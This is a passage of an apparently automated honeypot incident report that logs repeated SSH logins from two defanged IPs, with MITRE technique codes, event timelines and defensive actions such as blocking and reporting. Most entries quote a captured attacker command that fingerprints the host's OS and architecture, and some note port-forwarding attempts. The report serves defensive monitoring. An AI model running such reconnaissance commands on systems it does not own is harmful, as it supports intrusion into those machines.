| `2026-09-01 21:55:26` | `cowrie.login.success` |
| `2026-09-01 21:55:31` | `cowrie.session.params` |
| `2026-09-01 21:55:31` | `cowrie.command.input` |
| `2026-09-01 21:55:31` | `cowrie.command.input` |
| `2026-09-01 21:55:31` | `cowrie.command.input` |
| `2026-09-01 21:55:31` | `cowrie.command.input` |
| `2026-09-01 21:55:31` | `cowrie.command.input` |
| `2026-09-01 21:55:31` | `cowrie.command.success` |
| `2026-09-01 21:55:31` | `cowrie.command.input` |
| `2026-09-01 21:55:31` | `cowrie.command.input` |
| `2026-09-01 21:55:31` | `cowrie.command.input` |
| `2026-09-01 21:55:31` | `cowrie.command.input` |
| `2026-09-01 21:55:35` | `cowrie.log.closed` |
| `2026-09-01 21:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1306fccccba

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:56 |
| **Last Seen** | 2026-09-01 21:57 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:56:44` | `cowrie.session.connect` |
| `2026-09-01 21:56:46` | `cowrie.client.version` |
| `2026-09-01 21:56:46` | `cowrie.client.kex` |
| `2026-09-01 21:56:54` | `cowrie.login.success` |
| `2026-09-01 21:56:59` | `cowrie.session.params` |
| `2026-09-01 21:56:59` | `cowrie.command.input` |
| `2026-09-01 21:56:59` | `cowrie.command.input` |
| `2026-09-01 21:56:59` | `cowrie.command.input` |
| `2026-09-01 21:56:59` | `cowrie.command.input` |
| `2026-09-01 21:56:59` | `cowrie.command.input` |
| `2026-09-01 21:56:59` | `cowrie.command.success` |
| `2026-09-01 21:56:59` | `cowrie.command.input` |
| `2026-09-01 21:56:59` | `cowrie.command.input` |
| `2026-09-01 21:56:59` | `cowrie.command.input` |
| `2026-09-01 21:56:59` | `cowrie.command.input` |
| `2026-09-01 21:57:01` | `cowrie.log.closed` |
| `2026-09-01 21:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5daac3e789

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:58 |
| **Last Seen** | 2026-09-01 21:58 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:58:10` | `cowrie.session.connect` |
| `2026-09-01 21:58:13` | `cowrie.client.version` |
| `2026-09-01 21:58:13` | `cowrie.client.kex` |
| `2026-09-01 21:58:21` | `cowrie.login.success` |
| `2026-09-01 21:58:25` | `cowrie.session.params` |
| `2026-09-01 21:58:25` | `cowrie.command.input` |
| `2026-09-01 21:58:25` | `cowrie.command.input` |
| `2026-09-01 21:58:25` | `cowrie.command.input` |
| `2026-09-01 21:58:25` | `cowrie.command.input` |
| `2026-09-01 21:58:25` | `cowrie.command.input` |
| `2026-09-01 21:58:25` | `cowrie.command.success` |
| `2026-09-01 21:58:25` | `cowrie.command.input` |
| `2026-09-01 21:58:25` | `cowrie.command.input` |
| `2026-09-01 21:58:25` | `cowrie.command.input` |
| `2026-09-01 21:58:25` | `cowrie.command.input` |
| `2026-09-01 21:58:27` | `cowrie.log.closed` |
| `2026-09-01 21:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aedf4fdfc01a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:59 |
| **Last Seen** | 2026-09-01 21:59 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:59:40` | `cowrie.session.connect` |
| `2026-09-01 21:59:42` | `cowrie.client.version` |
| `2026-09-01 21:59:42` | `cowrie.client.kex` |
| `2026-09-01 21:59:50` | `cowrie.login.success` |
| `2026-09-01 21:59:52` | `cowrie.session.params` |
| `2026-09-01 21:59:52` | `cowrie.command.input` |
| `2026-09-01 21:59:52` | `cowrie.command.input` |
| `2026-09-01 21:59:52` | `cowrie.command.input` |
| `2026-09-01 21:59:52` | `cowrie.command.input` |
| `2026-09-01 21:59:52` | `cowrie.command.input` |
| `2026-09-01 21:59:52` | `cowrie.command.success` |
| `2026-09-01 21:59:52` | `cowrie.command.input` |
| `2026-09-01 21:59:52` | `cowrie.command.input` |
| `2026-09-01 21:59:52` | `cowrie.command.input` |
| `2026-09-01 21:59:52` | `cowrie.command.input` |
| `2026-09-01 21:59:54` | `cowrie.log.closed` |
| `2026-09-01 21:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80dcfdf989b9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:01 |
| **Last Seen** | 2026-09-01 22:01 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:01:08` | `cowrie.session.connect` |
| `2026-09-01 22:01:10` | `cowrie.client.version` |
| `2026-09-01 22:01:10` | `cowrie.client.kex` |
| `2026-09-01 22:01:18` | `cowrie.login.success` |
| `2026-09-01 22:01:23` | `cowrie.session.params` |
| `2026-09-01 22:01:23` | `cowrie.command.input` |
| `2026-09-01 22:01:23` | `cowrie.command.input` |
| `2026-09-01 22:01:23` | `cowrie.command.input` |
| `2026-09-01 22:01:23` | `cowrie.command.input` |
| `2026-09-01 22:01:23` | `cowrie.command.input` |
| `2026-09-01 22:01:23` | `cowrie.command.success` |
| `2026-09-01 22:01:23` | `cowrie.command.input` |
| `2026-09-01 22:01:23` | `cowrie.command.input` |
| `2026-09-01 22:01:23` | `cowrie.command.input` |
| `2026-09-01 22:01:23` | `cowrie.command.input` |
| `2026-09-01 22:01:26` | `cowrie.log.closed` |
| `2026-09-01 22:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef7ddb9cd26

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:02 |
| **Last Seen** | 2026-09-01 22:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:02:08` | `cowrie.session.connect` |
| `2026-09-01 22:02:08` | `cowrie.client.version` |
| `2026-09-01 22:02:08` | `cowrie.client.kex` |
| `2026-09-01 22:02:09` | `cowrie.login.success` |
| `2026-09-01 22:02:09` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:02:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:02:09` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62cae19a9f88

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:02 |
| **Last Seen** | 2026-09-01 22:02 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:02:38` | `cowrie.session.connect` |
| `2026-09-01 22:02:41` | `cowrie.client.version` |
| `2026-09-01 22:02:41` | `cowrie.client.kex` |
| `2026-09-01 22:02:49` | `cowrie.login.success` |
| `2026-09-01 22:02:50` | `cowrie.session.params` |
| `2026-09-01 22:02:50` | `cowrie.command.input` |
| `2026-09-01 22:02:50` | `cowrie.command.input` |
| `2026-09-01 22:02:50` | `cowrie.command.input` |
| `2026-09-01 22:02:50` | `cowrie.command.input` |
| `2026-09-01 22:02:50` | `cowrie.command.input` |
| `2026-09-01 22:02:50` | `cowrie.command.success` |
| `2026-09-01 22:02:50` | `cowrie.command.input` |
| `2026-09-01 22:02:50` | `cowrie.command.input` |
| `2026-09-01 22:02:50` | `cowrie.command.input` |
| `2026-09-01 22:02:50` | `cowrie.command.input` |
| `2026-09-01 22:02:52` | `cowrie.log.closed` |
| `2026-09-01 22:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-addad790c91a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 22:03 |
| **Last Seen** | 2026-09-01 22:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:03:34` | `cowrie.session.connect` |
| `2026-09-01 22:03:34` | `cowrie.client.version` |
| `2026-09-01 22:03:34` | `cowrie.client.kex` |
| `2026-09-01 22:03:35` | `cowrie.login.success` |
| `2026-09-01 22:03:35` | `cowrie.direct-tcpip.request` |
| `2026-09-01 22:03:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 22:03:35` | `cowrie.direct-tcpip.data` |
| `2026-09-01 22:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f9ccf03c70d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:04 |
| **Last Seen** | 2026-09-01 22:04 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:04:11` | `cowrie.session.connect` |
| `2026-09-01 22:04:13` | `cowrie.client.version` |
| `2026-09-01 22:04:13` | `cowrie.client.kex` |
| `2026-09-01 22:04:22` | `cowrie.login.success` |
| `2026-09-01 22:04:26` | `cowrie.session.params` |
| `2026-09-01 22:04:26` | `cowrie.command.input` |
| `2026-09-01 22:04:26` | `cowrie.command.input` |
| `2026-09-01 22:04:26` | `cowrie.command.input` |
| `2026-09-01 22:04:26` | `cowrie.command.input` |
| `2026-09-01 22:04:26` | `cowrie.command.input` |
| `2026-09-01 22:04:26` | `cowrie.command.success` |
| `2026-09-01 22:04:26` | `cowrie.command.input` |
| `2026-09-01 22:04:26` | `cowrie.command.input` |
| `2026-09-01 22:04:26` | `cowrie.command.input` |
| `2026-09-01 22:04:26` | `cowrie.command.input` |
| `2026-09-01 22:04:29` | `cowrie.log.closed` |
| `2026-09-01 22:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45f4ec78a65c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:05 |
| **Last Seen** | 2026-09-01 22:05 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:05:38` | `cowrie.session.connect` |
| `2026-09-01 22:05:40` | `cowrie.client.version` |
| `2026-09-01 22:05:40` | `cowrie.client.kex` |
| `2026-09-01 22:05:47` | `cowrie.login.success` |
| `2026-09-01 22:05:49` | `cowrie.session.params` |
| `2026-09-01 22:05:49` | `cowrie.command.input` |
| `2026-09-01 22:05:49` | `cowrie.command.input` |
| `2026-09-01 22:05:49` | `cowrie.command.input` |
| `2026-09-01 22:05:49` | `cowrie.command.input` |
| `2026-09-01 22:05:49` | `cowrie.command.input` |
| `2026-09-01 22:05:49` | `cowrie.command.success` |
| `2026-09-01 22:05:49` | `cowrie.command.input` |
| `2026-09-01 22:05:49` | `cowrie.command.input` |
| `2026-09-01 22:05:49` | `cowrie.command.input` |
| `2026-09-01 22:05:49` | `cowrie.command.input` |
| `2026-09-01 22:05:50` | `cowrie.log.closed` |
| `2026-09-01 22:05:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d23919d37559

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:07 |
| **Last Seen** | 2026-09-01 22:07 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:07:09` | `cowrie.session.connect` |
| `2026-09-01 22:07:11` | `cowrie.client.version` |
| `2026-09-01 22:07:11` | `cowrie.client.kex` |
| `2026-09-01 22:07:20` | `cowrie.login.success` |
| `2026-09-01 22:07:23` | `cowrie.session.params` |
| `2026-09-01 22:07:23` | `cowrie.command.input` |
| `2026-09-01 22:07:23` | `cowrie.command.input` |
| `2026-09-01 22:07:23` | `cowrie.command.input` |
| `2026-09-01 22:07:23` | `cowrie.command.input` |
| `2026-09-01 22:07:23` | `cowrie.command.input` |
| `2026-09-01 22:07:23` | `cowrie.command.success` |
| `2026-09-01 22:07:23` | `cowrie.command.input` |
| `2026-09-01 22:07:23` | `cowrie.command.input` |
| `2026-09-01 22:07:23` | `cowrie.command.input` |
| `2026-09-01 22:07:23` | `cowrie.command.input` |
| `2026-09-01 22:07:26` | `cowrie.log.closed` |
| `2026-09-01 22:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a639dd263c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:08 |
| **Last Seen** | 2026-09-01 22:08 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:08:44` | `cowrie.session.connect` |
| `2026-09-01 22:08:46` | `cowrie.client.version` |
| `2026-09-01 22:08:46` | `cowrie.client.kex` |
| `2026-09-01 22:08:54` | `cowrie.login.success` |
| `2026-09-01 22:08:56` | `cowrie.session.params` |
| `2026-09-01 22:08:56` | `cowrie.command.input` |
| `2026-09-01 22:08:56` | `cowrie.command.input` |
| `2026-09-01 22:08:56` | `cowrie.command.input` |
| `2026-09-01 22:08:56` | `cowrie.command.input` |
| `2026-09-01 22:08:56` | `cowrie.command.input` |
| `2026-09-01 22:08:56` | `cowrie.command.success` |
| `2026-09-01 22:08:56` | `cowrie.command.input` |
| `2026-09-01 22:08:56` | `cowrie.command.input` |
| `2026-09-01 22:08:56` | `cowrie.command.input` |
| `2026-09-01 22:08:56` | `cowrie.command.input` |
| `2026-09-01 22:08:56` | `cowrie.log.closed` |
| `2026-09-01 22:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79e6a7478800

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:10 |
| **Last Seen** | 2026-09-01 22:10 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:10:14` | `cowrie.session.connect` |
| `2026-09-01 22:10:16` | `cowrie.client.version` |
| `2026-09-01 22:10:16` | `cowrie.client.kex` |
| `2026-09-01 22:10:25` | `cowrie.login.success` |
| `2026-09-01 22:10:27` | `cowrie.session.params` |
| `2026-09-01 22:10:27` | `cowrie.command.input` |
| `2026-09-01 22:10:27` | `cowrie.command.input` |
| `2026-09-01 22:10:27` | `cowrie.command.input` |
| `2026-09-01 22:10:27` | `cowrie.command.input` |
| `2026-09-01 22:10:27` | `cowrie.command.input` |
| `2026-09-01 22:10:27` | `cowrie.command.success` |
| `2026-09-01 22:10:27` | `cowrie.command.input` |
| `2026-09-01 22:10:27` | `cowrie.command.input` |
| `2026-09-01 22:10:27` | `cowrie.command.input` |
| `2026-09-01 22:10:27` | `cowrie.command.input` |
| `2026-09-01 22:10:29` | `cowrie.log.closed` |
| `2026-09-01 22:10:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfab35da7494

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 22:11 |
| **Last Seen** | 2026-09-01 22:11 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 22:11:43` | `cowrie.session.connect` |
| `2026-09-01 22:11:45` | `cowrie.client.version` |
| `2026-09-01 22:11:45` | `cowrie.client.kex` |
| `2026-09-01 22:11:54` | `cowrie.login.success` |
